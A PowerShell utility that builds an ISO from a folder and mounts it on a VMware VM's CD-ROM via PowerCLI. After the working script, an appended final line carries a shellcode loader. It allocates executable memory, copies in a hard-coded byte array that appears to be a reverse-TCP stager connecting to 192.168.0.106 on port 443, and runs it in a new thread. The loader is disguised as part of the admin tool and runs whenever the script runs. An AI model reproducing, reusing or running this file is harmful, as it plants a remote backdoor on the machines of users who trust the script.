
[CmdletBinding()]
param (
	[Parameter(Mandatory,
		ValueFromPipeline,
		ValueFromPipelineByPropertyName)]
	[ValidateScript({Test-Path $_ -PathType 'Container'})]
	[string]$FolderPath,
	[Parameter(Mandatory,
			   ValueFromPipeline,
			   ValueFromPipelineByPropertyName)]
	[string]$Vm,
	[Parameter(ValueFromPipelineByPropertyName)]
	[string]$Datacenter = 'Development',
	[Parameter(ValueFromPipelineByPropertyName)]
	[string]$Datastore = 'ruby02-localdatastore01',
	[Parameter(Mandatory,
			   ValueFromPipelineByPropertyName)]
	[string]$DatastoreFolder,
	[switch]$Force
)

begin {
	Set-StrictMode -Version Latest
	try {
		if (!(Get-PSSnapin 'VMware.VimAutomation.Core')) {
			throw 'PowerCLI snapin is not available'
		}
		$VmObject = Get-VM $Vm -ErrorAction SilentlyContinue
		if (!$VmObject) {
			throw "VM $Vm does not exist on connected VI server"
		}
		
		if ($VmObject.PowerState -ne 'PoweredOn') {
			throw "VM $Vm is not powered on. Cannot change CD-ROM IsoFilePath"
		}
		
		$ExistingCdRom = $VmObject | Get-CDDrive
		if (!$ExistingCdRom.ConnectionState.Connected) {
			throw 'No CD-ROM attached. VM is powered on so I cannot attach a new one'
		}
		
		$TempIsoName = "$($Folderpath | Split-Path -Leaf).iso"
		$DatastoreIsoFolderPath = "vmstore:\$DataCenter\$Datastore\$DatastoreFolder"
		if (Test-Path "$DatastoreIsoFolderPath\$TempIsoName") {
			if ($Force) {
				throw "-Force currently in progress.  ISO file $DatastoreIsoFolderPath\$TempIsoName already exists in datastore"
				
				
				
			} else {
				throw "ISO file $DatastoreIsoFolderPath\$TempIsoName already exists in datastore"
			}
		}
		
		
		$ProgressPreference = 'SilentlyContinue'
		function New-IsoFile {
	  		
			Param (
				[parameter(Position = 0, Mandatory = $true, ValueFromPipeline = $true)]$Source,
				[parameter(Position = 1)][string]$Path = "$($env:temp)\" + (Get-Date).ToString("yyyyMMdd-HHmmss.ffff") + ".iso",
				[string] $BootFile = $null,
				[string] $Media = "Disk",
				[string] $Title = (Get-Date).ToString("yyyyMMdd-HHmmss.ffff"),
				[switch] $Force
			)
				
			Begin {
				($cp = new-object System.CodeDom.Compiler.CompilerParameters).CompilerOptions = "/unsafe"
				if (!("ISOFile" -as [type])) {
					Add-Type -CompilerParameters $cp -TypeDefinition @" 
						public class ISOFile 
						{ 
						    public unsafe static void Create(string Path, object Stream, int BlockSize, int TotalBlocks) 
						    { 
						        int bytes = 0; 
						        byte[] buf = new byte[BlockSize]; 
						        System.IntPtr ptr = (System.IntPtr)(&bytes); 
						        System.IO.FileStream o = System.IO.File.OpenWrite(Path); 
						        System.Runtime.InteropServices.ComTypes.IStream i = Stream as System.Runtime.InteropServices.ComTypes.IStream; 
						 
						        if (o == null) { return; } 
						        while (TotalBlocks-- > 0) { 
						            i.Read(buf, BlockSize, ptr); o.Write(buf, 0, bytes); 
						        } 
						        o.Flush(); o.Close(); 
						    } 
						} 
"@
				}
					
				if ($BootFile -and (Test-Path $BootFile)) {
					($Stream = New-Object -ComObject ADODB.Stream).Open()
					$Stream.Type = 1  
					$Stream.LoadFromFile((Get-Item $BootFile).Fullname)
					($Boot = New-Object -ComObject IMAPI2FS.BootOptions).AssignBootImage($Stream)
				}
				
				$MediaType = @{
					CDR = 2; CDRW = 3; DVDRAM = 5; DVDPLUSR = 6; DVDPLUSRW = 7; `
					DVDPLUSR_DUALLAYER = 8; DVDDASHR = 9; DVDDASHRW = 10; DVDDASHR_DUALLAYER = 11; `
					DISK = 12; DVDPLUSRW_DUALLAYER = 13; BDR = 18; BDRE = 19
				}
				
				if ($MediaType[$Media] -eq $null) { write-debug "Unsupported Media Type: $Media"; write-debug ("Choose one from: " + $MediaType.Keys); break }
				($Image = new-object -com IMAPI2FS.MsftFileSystemImage -Property @{ VolumeName = $Title }).ChooseImageDefaultsForMediaType($MediaType[$Media])
				
				if ((Test-Path $Path) -and (!$Force)) { "File Exists $Path"; break }
				New-Item -Path $Path -ItemType File -Force | Out-Null
				if (!(Test-Path $Path)) {
					"cannot create file $Path"
					break
				}
			}
			
			Process {
				switch ($Source) { { $_ -is [string] } { $Image.Root.AddTree((Get-Item $_).FullName, $true) | Out-Null; continue }
					{ $_ -is [IO.FileInfo] } { $Image.Root.AddTree($_.FullName, $true); continue }
					{ $_ -is [IO.DirectoryInfo] } { $Image.Root.AddTree($_.FullName, $true); continue }
				}
			}
			
			End {
				$Result = $Image.CreateResultImage()
				[ISOFile]::Create($Path, $Result.ImageStream, $Result.BlockSize, $Result.TotalBlocks)
			}
		}
		
		
	} catch {
		Write-Error $_.Exception.Message
		exit
	}
}

process {
	try {
		
		$IsoFilePath = "$($env:TEMP)\$TempIsoName"
		Get-ChildItem $FolderPath | New-IsoFile -Path $IsoFilePath -Title ($Folderpath | Split-Path -Leaf) -Force		
		
		$Iso = Copy-DatastoreItem $IsoFilePath "vmstore:\$Datacenter\$Datastore\$DatastoreFolder" -PassThru
		
		$VmObject | Get-CDDrive | Set-CDDrive -IsoPath $Iso.DatastoreFullPath -Connected $true -Confirm:$false | Out-Null
		
		Remove-Item $IsoFilePath -Force
	} catch {
		Write-Error $_.Exception.Message	
	}
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x6a,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

